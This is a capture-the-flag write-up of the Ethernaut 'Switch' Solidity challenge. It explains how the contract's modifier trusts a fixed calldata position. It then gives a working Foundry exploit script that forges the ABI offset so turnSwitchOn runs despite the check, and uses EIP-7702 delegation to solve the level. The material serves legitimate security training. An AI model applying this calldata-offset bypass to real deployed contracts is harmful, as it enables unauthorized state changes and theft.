---
title: "Ethernaut 29 Switch"
description: "Ethernaut 29 Switch writeup"
---

## Challenge
### Description
Just have to flip the switch. Can't be that hard, right?
Things that might help:
Understanding how CALLDATA is encoded.
### Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success,) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }
}
```
## Background

---

The calldata of a Solidity function call places the arguments after the 4-byte function selector according to ABI rules. For dynamic types like `bytes`, `string`, and dynamic arrays, the head area holds an offset pointing to the tail area instead of the data itself.
When `flipSwitch(bytes)` is called normally, the layout is roughly:
```plain text
0x00 ~ 0x03: flipSwitch(bytes) selector
0x04 ~ 0x23: _data offset = 0x20
0x24 ~ 0x43: _data length
0x44 ~     : _data bytes
```
Here the offset is computed relative to the start of the argument area excluding the function selector, that is, byte `4`. So if the offset is `0x20`, the actual length position is `4 + 0x20 = 36`, and the position of the first byte of `_data` is `36 + 32 = 68`.

---

A function selector is the first 4 bytes of the `keccak256` hash of the function signature.
```solidity
bytes4(keccak256("flipSwitch(bytes)"));
bytes4(keccak256("turnSwitchOff()"));
bytes4(keccak256("turnSwitchOn()"));
```
`address(this).call(_data)` treats the first 4 bytes of `_data` as a selector and re-invokes a function on the current contract. The `_data` that must ultimately execute has to start with the `turnSwitchOn()` selector.
## Code analysis

---

`onlyThis` checks that the caller is the contract itself.
```solidity
modifier onlyThis() {
    require(msg.sender == address(this), "Only the contract can call this");
    _;
}

function turnSwitchOn() public onlyThis {
    switchOn = true;
}

function turnSwitchOff() public onlyThis {
    switchOn = false;
}
```
`turnSwitchOn()` and `turnSwitchOff()` cannot be called directly. If an external account or an attacker contract calls them directly, `msg.sender` is not the `Switch` contract itself, so it reverts.
So in this challenge we have to make the `Switch` contract call itself through `address(this).call(_data)` inside `flipSwitch()`.

---

`onlyOff` checks a fixed position.
```solidity
modifier onlyOff() {
    bytes32[1] memory selector;
    assembly {
        calldatacopy(selector, 68, 4)
    }
    require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
    _;
}
```
`onlyOff` reads 4 bytes from byte `68` of the calldata and checks whether that value is the `turnSwitchOff()` selector. In normal ABI encoding the first 4 bytes of `_data` land exactly at byte `68`, so this check looks like it verifies that `_data` starts with `turnSwitchOff()`.
But it trusts `68` as a fixed position, while the actual position of `_data` comes from the offset value in the calldata. By changing the offset, you can make the position `onlyOff` checks differ from the position the ABI decoder interprets as `_data`.

---

Last is the internal call in `flipSwitch`.
```solidity
function flipSwitch(bytes memory _data) public onlyOff {
    (bool success,) = address(this).call(_data);
    require(success, "call failed :(");
}
```
As long as `onlyOff` passes, `flipSwitch` feeds the ABI-decoded `_data` straight into `address(this).call(_data)`. So we put the `turnSwitchOff()` selector at byte `68` of the calldata to pass the check, and put the `turnSwitchOn()` selector at the actual `_data` position.
## Solution
`onlyOff` only looks at byte `68`. But `_data` of `flipSwitch(bytes)` follows the offset contained in the calldata. Place the `turnSwitchOff()` selector at byte `68` to pass the check, and push the offset to `0x60` so the actual `_data` points to a `turnSwitchOn()` selector placed further back.
The layout:
```plain text
0x00 ~ 0x03: flipSwitch(bytes) selector
0x04 ~ 0x23: _data offset = 0x60
0x24 ~ 0x43: dummy 32 bytes
0x44 ~ 0x63: turnSwitchOff() selector + padding
0x64 ~ 0x83: _data length = 4
0x84 ~ 0xa3: turnSwitchOn() selector + padding
```
Byte `0x44` is `68` in decimal. So `onlyOff` reads the `turnSwitchOff()` selector here and passes. The ABI decoder, on the other hand, sees offset `0x60` and interprets byte `4 + 0x60 = 100`, that is position `0x64`, as the `_data` length. Since the length is `4`, the actual `_data` is the next 4 bytes, the `turnSwitchOn()` selector.
The internal call becomes `address(this).call(hex"turnSwitchOn selector")`, and the `msg.sender` of this call is the `Switch` contract itself, so `onlyThis` also passes.

---

A single Foundry script handles instance creation, sending the payload, and level submission. It precomputes the new instance address from `SwitchFactory`'s nonce, then sends the calldata built by `_flipSwitchPayload()`.
Since `SwitchFactory.createInstance()` executes `new Switch()` inside `createLevelInstance()`, the instance address can be computed with `computeCreateAddress(SWITCH_LEVEL, factoryNonce)`.
### Exploit
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Script.sol";

interface IEthernaut29 {
    function createLevelInstance(address level) external payable;
    function submitLevelInstance(address payable instance) external;
}

interface ISwitch {
    function switchOn() external view returns (bool);
}

contract Sol29Delegation {
    address private immutable owner;

    constructor(address owner_) {
        owner = owner_;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "only owner");
        _;
    }

    function solve(address ethernaut, address switchLevel, uint256 factoryNonce, uint256 createGas)
        external
        onlyOwner
        returns (address instance)
    {
        instance = _computeCreateAddress(switchLevel, factoryNonce);

        IEthernaut29(ethernaut).createLevelInstance{gas: createGas}(switchLevel);

        (bool ok,) = instance.call(_flipSwitchPayload());
        require(ok, "flipSwitch failed");
        require(ISwitch(instance).switchOn(), "switch is still off");

        IEthernaut29(ethernaut).submitLevelInstance(payable(instance));
    }

    function _flipSwitchPayload() private pure returns (bytes memory) {
        bytes4 flip = bytes4(keccak256("flipSwitch(bytes)"));
        bytes4 off = bytes4(keccak256("turnSwitchOff()"));
        bytes4 on = bytes4(keccak256("turnSwitchOn()"));

        return abi.encodePacked(
            flip,
            uint256(96),
            uint256(0),
            off,
            bytes28(0),
            uint256(4),
            on,
            bytes28(0)
        );
    }

    function _computeCreateAddress(address deployer, uint256 nonce) private pure returns (address) {
        if (nonce == 0) {
            return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, bytes1(0x80))))));
        }
        if (nonce <= 0x7f) {
            return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, uint8(nonce))))));
        }
        if (nonce <= type(uint8).max) {
            return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd7), bytes1(0x94), deployer, bytes1(0x81), uint8(nonce))))));
        }
        if (nonce <= type(uint16).max) {
            return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd8), bytes1(0x94), deployer, bytes1(0x82), uint16(nonce))))));
        }
        if (nonce <= type(uint24).max) {
            return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd9), bytes1(0x94), deployer, bytes1(0x83), uint24(nonce))))));
        }
        return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xda), bytes1(0x94), deployer, bytes1(0x84), uint32(nonce))))));
    }
}

contract Sol29 is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address player = vm.addr(privateKey);
        IEthernaut29 ethernaut = IEthernaut29(vm.envAddress("ETHERNAUT_INSTANCE"));
        address switchLevel = vm.envAddress("SWITCH_LEVEL");
        uint256 createGas = vm.envOr("SWITCH_CREATE_GAS", uint256(1_000_000));
        uint256 factoryNonce = vm.envOr("SWITCH_FACTORY_NONCE", uint256(vm.getNonce(switchLevel)));

        vm.broadcast(privateKey);
        Sol29Delegation implementation = new Sol29Delegation(player);

        vm.broadcast(privateKey);
        vm.signAndAttachDelegation(address(implementation), privateKey);
        Sol29Delegation(payable(player)).solve(address(ethernaut), switchLevel, factoryNonce, createGas);
    }
}

contract Sol29Clear is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        vm.signAndAttachDelegation(address(0), privateKey);
        vm.broadcast(privateKey);
        (bool success,) = payable(address(0)).call("");
        require(success, "clear delegation failed");
    }
}
```
![screenshot](./image-1.png)
